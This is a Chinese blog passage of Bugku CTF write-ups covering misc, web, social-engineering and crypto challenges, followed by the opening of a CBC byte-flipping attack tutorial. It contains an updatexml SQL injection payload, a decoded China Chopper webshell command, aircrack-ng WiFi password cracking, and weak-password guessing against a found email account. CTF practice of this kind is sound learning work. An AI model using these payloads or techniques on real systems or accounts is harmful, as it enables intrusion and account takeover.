<h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><p>直接提交16进制数字即可。</p>
<h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><p>还是数字绕过 <code>?ctf[]=1234</code></p>
<h1 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h1><h2 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h2><p>看到文件名是个zip，改后缀名为zip打开，解压后发现是个doc文件，但是带不开，看一下16进制发现 <code>504b0304</code>的开头，所以应该是一个zip文件，在改后缀为zip解压，找出flag即可。</p>
<h2 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h2><p>binwalk跑一下发现有两个图片，切一下即可<br><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">falg</span><span class="template-variable">&#123;NSCTF_e6532a34928a3d1dadd0b049d5a3cc57&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></p>
<h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>百度可知bin后缀为路由器备份文件，有routepassview打开找username字段即可。</p>
<h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>binwalk跑一下即可，之后得到一个压缩包，需要密码，但是密码只有三位数，暴力破解即可密码871，然后16进制打开，在末尾即可得到flag，花括号内还要base64解码，注意吧flag的@换成a，这是一个坑。</p>
<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>直接解压，然后有个flag文件，hex里面找一下key即可。</p>
<h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>下载后是个数据流文件，wireshark查看一下，由于是菜刀连接，所以只需要查看http协议即可，在第四个http协议里面发现了一句话木马，所以猜测数据传输应该在这之后，追踪一下http流，发现一段base64代码，解之<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">'5.3.0'</span>)&#123;</span><br><span class="line">	@set_magic_quotes_runtime0);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$F=<span class="string">'C:\\wwwroot\\3.php'</span>;</span><br><span class="line">$P=@fopen($F,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span>(@fread($P,filesize($F)));</span><br><span class="line">@fclose($P);;<span class="keyword">echo</span>(<span class="string">"X@Y"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></p>
<p>这应该是打开某个文件，开头和末尾都是 <code>X@Y</code>,查看下一个http流</p>
<p><img src="bugku-writeup续/2.png" alt=""></p>
<p>这应该就是传输的文件，查看一下分组字节，然后把前后的X@Y去掉，解码为压缩形式即可得到flag</p>
<h2 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>这个题不是很理解，数据流审计还很菜，这里记录一下别人的解法，观察tcp可以看出从104个包开始攻击机开始扫描目标机，在以5542开始的包就已经getshell，所以追踪一下tcp流，发现有个txt文件，有一段base64，解码即可得到flag、</p>
<h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>改变图片高度即可</p>
<h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p>这个题不是很理解工具怎么使用，WiFi不是很了解，写一个字典出来，工具跑一下，命令如下</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">aircrack-ng</span> <span class="selector-tag">wifi</span><span class="selector-class">.cap</span> <span class="selector-tag">-w</span> <span class="selector-tag">passwd</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure>
<p><img src="bugku-writeup续/3.png" alt=""></p>
<h2 id="linux2"><a href="#linux2" class="headerlink" title="linux2"></a>linux2</h2><p>下载文件，先是binwalk了一下，发现一个图片，还有一个图片，图片是一个flag内容，然而并不对，看了比人的wp才知道了正解，没必要binwalk直接跑一下命令即可</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">strings </span><span class="keyword">brave </span>&gt; a.txt</span><br></pre></td></tr></table></figure>
<p>然后在a.txt中搜索一下 <code>key</code>，直接出现了flag</p>
<h2 id="账号被盗了-1"><a href="#账号被盗了-1" class="headerlink" title="账号被盗了"></a>账号被盗了</h2><p>这题不会…</p>
<h2 id="聪明的大象"><a href="#聪明的大象" class="headerlink" title="聪明的大象"></a>聪明的大象</h2><p>解压图片发现备注栏有一段base64，再看图片大小6M多，应该是加了东西，binwalk跑一下，切出来一个解压包，密码就是刚刚的base64，解之是一张图片，是以前的一道题，改变高度即可得到flag</p>
<h1 id="web进阶"><a href="#web进阶" class="headerlink" title="web进阶"></a>web进阶</h1><h2 id="实战2-注入"><a href="#实战2-注入" class="headerlink" title="实战2-注入"></a>实战2-注入</h2><p>打开后发现news页面有id参数，加引号可以报错注入<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">18</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select table_name from information_schema.tables where table_schema=database() limit <span class="number">21</span>,<span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
<h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>扫描目录，发现有一个 <code>show.php</code>进入即可得到flag！！！！不过不知道是不是正解。</p>
<h1 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h1><h2 id="社工进阶"><a href="#社工进阶" class="headerlink" title="社工进阶"></a>社工进阶</h2><p>百度搜索孤长离发现有个贴吧，里面有个邮箱，尝试弱口令登录，百度top100弱口令，第二个就是了 <code>a123456</code></p>
<h2 id="信息查找"><a href="#信息查找" class="headerlink" title="信息查找"></a>信息查找</h2><p>直接百度 <code>bugku.cn 今日头条</code>，第一个结果的群号即可。</p>
<h2 id="简单个人信息收集"><a href="#简单个人信息收集" class="headerlink" title="简单个人信息收集"></a>简单个人信息收集</h2><p>首先下载到一个压缩包，发现是伪加密，破解之，然后在上社工库查询一下即可。</p>
<h2 id="简单的社工尝试"><a href="#简单的社工尝试" class="headerlink" title="简单的社工尝试"></a>简单的社工尝试</h2><p>google识图，然后有一个github相关的页面，点进去之后有一个微博链接，进去之后有个图片，打开图片中的链接即可。</p>
<h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><p>凯撒移位，代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-70</span>,<span class="number">32</span>):</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> cipher:</span><br><span class="line">		<span class="comment"># print(ord(j)+i)</span></span><br><span class="line">		<span class="keyword">if</span> (ord(j)+i) &gt; <span class="number">132</span> <span class="keyword">or</span> (ord(j)+i) &lt; <span class="number">33</span>:</span><br><span class="line">			<span class="keyword">break</span> </span><br><span class="line">		print(chr(ord(j)+i),end=<span class="string">""</span>)</span><br><span class="line">	print(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="一段base64"><a href="#一段base64" class="headerlink" title="一段base64"></a>一段base64</h2><p>多层解码，贴上代码:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'base64.txt'</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="comment"># base64解码</span></span><br><span class="line">	text = file.read()</span><br><span class="line">	text = base64.b64decode(text)</span><br><span class="line">	text = text.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">	alp = re.findall(<span class="string">r'([0-7]+)'</span>,text)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># base64解码后发现像8进制，8进制转换成10进制</span></span><br><span class="line">	new_alp = []</span><br><span class="line">	<span class="keyword">for</span> item <span class="keyword">in</span> alp:</span><br><span class="line">		new_alp.append(int(item,<span class="number">8</span>))</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># ascii解码	</span></span><br><span class="line">	alp = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> new_alp:</span><br><span class="line">		alp += str(chr(i))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 前面的解码后为'\xdd'的形式，推测为16进制	</span></span><br><span class="line">	plain = <span class="string">''</span></span><br><span class="line">	cipher = re.findall(<span class="string">r'\\x([0-9a-f]+)'</span>,alp)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">		plain += str(chr(int(i,<span class="number">16</span>)))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unicode解码</span></span><br><span class="line">	cipher2 = bytes(plain,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">	plain2 = cipher2.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># ascii解码</span></span><br><span class="line">	cipher3 = re.findall(<span class="string">r'[0-9]&#123;2,&#125;'</span>,plain2)</span><br><span class="line">	plain3 = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher3:</span><br><span class="line">		plain3 += chr(int(i))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unicode解码</span></span><br><span class="line">	cipher4 = re.findall(<span class="string">r'#x([0-9a-f]+)'</span>,plain3)</span><br><span class="line">	plain4 = []</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher4:</span><br><span class="line">		plain4.append(int(i,<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># ascii解码</span></span><br><span class="line">	cipher5 = plain4</span><br><span class="line">	plain5 = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher5:</span><br><span class="line">		plain5 += chr(i)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># unicode</span></span><br><span class="line">	cipher6 = re.findall(<span class="string">r'&amp;#([0-9]&#123;2,&#125;)'</span>,plain5)</span><br><span class="line">	plain6 = <span class="string">''</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> cipher6:</span><br><span class="line">		plain6 += chr(int(i))</span><br><span class="line"></span><br><span class="line">	<span class="comment"># urldecode</span></span><br><span class="line">	print(parse.unquote(plain6))</span><br></pre></td></tr></table></figure>
<h2 id="‘"><a href="#‘" class="headerlink" title="‘!?"></a>‘!?</h2><p>看了别人的wp，这题还是Ook!语言跑一下</p>
<h2 id=""><a href="#" class="headerlink" title="+[]-"></a>+[]-</h2><p>brainfuck语言跑一下</p>
<h2 id="奇怪的密码"><a href="#奇怪的密码" class="headerlink" title="奇怪的密码"></a>奇怪的密码</h2><p>其实就是把flag的每一位的ascii值一次加1,2,3,..反过来解一下就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'gndk€rlqhmtkwwp&#125;z'</span></span><br><span class="line">plain = <span class="string">''</span></span><br><span class="line">seq = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">	<span class="keyword">if</span> i == <span class="string">'€'</span>:     <span class="comment"># 该字符为非法字符，不去掉的话可能会报错</span></span><br><span class="line">		seq += <span class="number">1</span></span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	plain += chr((ord(i) - seq))</span><br><span class="line">	seq += <span class="number">1</span></span><br><span class="line">print(plain)</span><br></pre></td></tr></table></figure>
<h2 id="托马斯杰斐逊"><a href="#托马斯杰斐逊" class="headerlink" title="托马斯杰斐逊"></a>托马斯杰斐逊</h2><p>根据提示可知是杰斐逊圆盘加密，附上解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">tomas = <span class="string">'''ZWAXJGDLUBVIQHKYPNTCRMOSFE</span></span><br><span class="line"><span class="string">KPBELNACZDTRXMJQOYHGVSFUWI</span></span><br><span class="line"><span class="string">BDMAIZVRNSJUWFHTEQGYXPLOCK</span></span><br><span class="line"><span class="string">RPLNDVHGFCUKTEBSXQYIZMJWAO</span></span><br><span class="line"><span class="string">IHFRLABEUOTSGJVDKCPMNZQWXY</span></span><br><span class="line"><span class="string">AMKGHIWPNYCJBFZDRUSLOQXVET</span></span><br><span class="line"><span class="string">GWTHSPYBXIZULVKMRAFDCEONJQ</span></span><br><span class="line"><span class="string">NOZUTWDCVRJLXKISEFAPMYGHBQ</span></span><br><span class="line"><span class="string">QWATDSRFHENYVUBMCOIKZGJXPL</span></span><br><span class="line"><span class="string">WABMCXPLTDSRJQZGOIKFHENYVU</span></span><br><span class="line"><span class="string">XPLTDAOIKFZGHENYSRUBMCQWVJ</span></span><br><span class="line"><span class="string">TDSWAYXPLVUBOIKZGJRFHENMCQ</span></span><br><span class="line"><span class="string">BMCSRFHLTDENQWAOXPYVUIKZGJ</span></span><br><span class="line"><span class="string">XPHKZGJTDSENYVUBMLAOIRFCQW</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">new_tomas = []</span><br><span class="line">tmp = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(tomas)):</span><br><span class="line">	<span class="keyword">if</span> tomas[i] == <span class="string">'\n'</span>:</span><br><span class="line">		new_tomas.append(tmp)</span><br><span class="line">		tmp = <span class="string">''</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		tmp += tomas[i]</span><br><span class="line">key =  [<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">14</span>,<span class="number">10</span>,<span class="number">13</span>,<span class="number">11</span>,<span class="number">12</span>]</span><br><span class="line">cipher = <span class="string">'HCBTSXWCRQGLES'</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line">	<span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">		<span class="keyword">if</span> new_tomas[key[index]<span class="number">-1</span>][p] == cipher[index]:</span><br><span class="line">			new_tomas[key[index]<span class="number">-1</span>] = new_tomas[key[index]<span class="number">-1</span>][p:] + new_tomas[key[index]<span class="number">-1</span>][:p]</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> key:</span><br><span class="line">	print(new_tomas[item<span class="number">-1</span>][<span class="number">-6</span>:]+new_tomas[item<span class="number">-1</span>][:<span class="number">-6</span>])   <span class="comment"># 让输出更明显一点</span></span><br></pre></td></tr></table></figure>
<p>输出如下</p>
<blockquote>
<p>XMJQOYHGVSFUWIKPBELNACZDTR<br>SGJVDKCPMNZQWXYIHFRLABEUOT<br>XJGDLUBVIQHKYPNTCRMOSFEZWA<br>SJUWFHTEQGYXPLOCKBDMAIZVRN<br>BFZDRUSLOQXVETAMKGHIWPNYCJ<br>UKTEBSXQYIZMJWAORPLNDVHGFC<br>GJXPLQWATDSRFHENYVUBMCOIKZ<br>KMRAFDCEONJQGWTHSPYBXIZULV<br>UTWDCVRJLXKISEFAPMYGHBQNOZ<br>AOIRFCQWXPHKZGJTDSENYVUBML<br>DSRJQZGOIKFHENYVUWABMCXPLT<br>MCSRFHLTDENQWAOXPYVUIKZGJB<br>IKFZGHENYSRUBMCQWVJXPLTDAO<br>NMCQTDSWAYXPLVUBOIKZGJRFHE</p>
</blockquote>
<p>好像默认是按照第7位来当做密文，所以我特地按照这个格式来，那么第一列就是明文了，注意flag要求小写。</p>
<h2 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h2><p>已经说了是zip伪加密，直接16进制修改一下即可</p>
<h2 id="告诉你个秘密-ISCCCTF"><a href="#告诉你个秘密-ISCCCTF" class="headerlink" title="告诉你个秘密(ISCCCTF)"></a>告诉你个秘密(ISCCCTF)</h2><p>看字符串像16进制，转成字符串可以看到像base64，再解码一次</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">r5yG</span> lp9I <span class="keyword">BjM </span>tFhBT6uh y7iJ QsZ <span class="keyword">bhM</span></span><br></pre></td></tr></table></figure>
<p>这是键盘对应的码</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">TONGYUAN</span></span><br></pre></td></tr></table></figure>
<p>注意本题没有说明flag的提交方式，应该是 <code>flag:TONGYUAN</code></p>
<h2 id="来自宇宙的信号"><a href="#来自宇宙的信号" class="headerlink" title="来自宇宙的信号"></a>来自宇宙的信号</h2><p>既然说了是银河战队，直接百度搜 <code>银河 文字</code>，会看到第一个结果赫然是标准银河字母，对照一下就可以了。</p>
<p>至此，所有加密题目OK。</p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CBC字节翻转攻击]]></title>
      <url>/2018/03/23/CBC-Attack/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h1><p>最近连着看了几篇CBC翻转攻击相关的文章，又正好遇到了这样的题目，所以来做一波看看一下。题目就是bugku上面的这道题目<a href="http://118.89.219.210:49168/index.php" target="_blank" rel="noopener">传送门</a>。</p>
<a id="more"></a>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a><strong>原理</strong></h1><p>CBC攻击方法的精髓在于通过损坏密文字节来改变明文字节，从而达到绕过过滤器或者提权等目的。贴一张图片</p>
<p><img src="CBC-Attack/1.png" alt="加密原理"></p>
<blockquote>
<p><font face="futura">plaintext:</font>待加密的数据</p>
<p><font face="futura">Ⅳ：</font>用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文</p>
<p><font face="“futura">Ciphertext：</font>加密后的数据</p>
</blockquote>
<p><strong>注意：</strong>CBC工作于一个固定长度的比特组，称之为块(BLOCK)，本文中将使用16字节的块。</p>
<p><strong>加密过程：</strong></p>
<p>1.首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。<br>2.生成一个随机的初始化向量(IV)和一个密钥。<br>3.将IV和第一组明文异或。<br>4.用密钥对3中xor后产生的密文加密。<br>5.用4中产生的密文对第二组明文进行xor操作。<br>6.用密钥对5中产生的密文加密。<br>7.重复4-7，到最后一组明文。<br>8.将IV和加密后的密文拼接在一起，得到最终的密文。</p>
<p>从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：<em>前一块的密文用来产生后一块的密文</em>。</p>
<p><strong>解密过程：</strong></p>
<p><img src="CBC-Attack/2.png" alt="解密过程"></p>
<p>解密过程就是加密过程的逆过程</p>
<p>1.从密文中提取出IV，然后将密文分组。<br>2.使用密钥对第一组的密文解密，然后和IV进行xor得到明文。<br>3.使用密钥对第二组密文解密，然后和2中的密文xor得到明文。<br>4.重复2-3，直到最后一组密文。</p>
<p><strong>攻击原理图</strong></p>
<p><img src="CBC-Attack/3.png" alt="攻击过程"></p>
<p>这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。</p>
<p>介绍一下异或的概念</p>
<blockquote>
<p>当我们的一个值C是由A和B异或得到<br>C = A XOR B<br>那么<br>A XOR B XOR C很明显是=0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A = B XOR C<br>因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。</p>
</blockquote>
<h1 id="上手题目"><a href="#上手题目" class="headerlink" title="上手题目"></a><strong>上手题目</strong></h1><p>存在目录泄露 <code>.index.php.swp</code>，会下载到一个源码，需要用vim恢复一下，使用下面的命令</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi -r &#123;your <span class="built_in">file</span> <span class="built_in">name</span>&#125;</span><br></pre></td></tr></table></figure>
<p>然后用下面的命令删除swp文件，不然每一次编辑时总是有这个提示。 </p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm .&#123;your <span class="built_in">file</span> <span class="built_in">name</span>&#125;.swp</span><br></pre></td></tr></table></figure>
<p>再输入7即可恢复代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">"static/css/style.css"</span> rel=<span class="string">"stylesheet"</span> type=<span class="string">"text/css"</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">$(document).ready(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$(<span class="string">".username"</span>).focus(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$(<span class="string">".user-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"-48px"</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(<span class="string">".username"</span>).blur(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$(<span class="string">".user-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"0px"</span>);</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	$(<span class="string">".password"</span>).focus(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$(<span class="string">".pass-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"-48px"</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(<span class="string">".password"</span>).blur(<span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$(<span class="string">".pass-icon"</span>).css(<span class="string">"left"</span>,<span class="string">"0px"</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">"SECRET_KEY"</span>, file_get_contents(<span class="string">'/root/key'</span>));</span><br><span class="line">define(<span 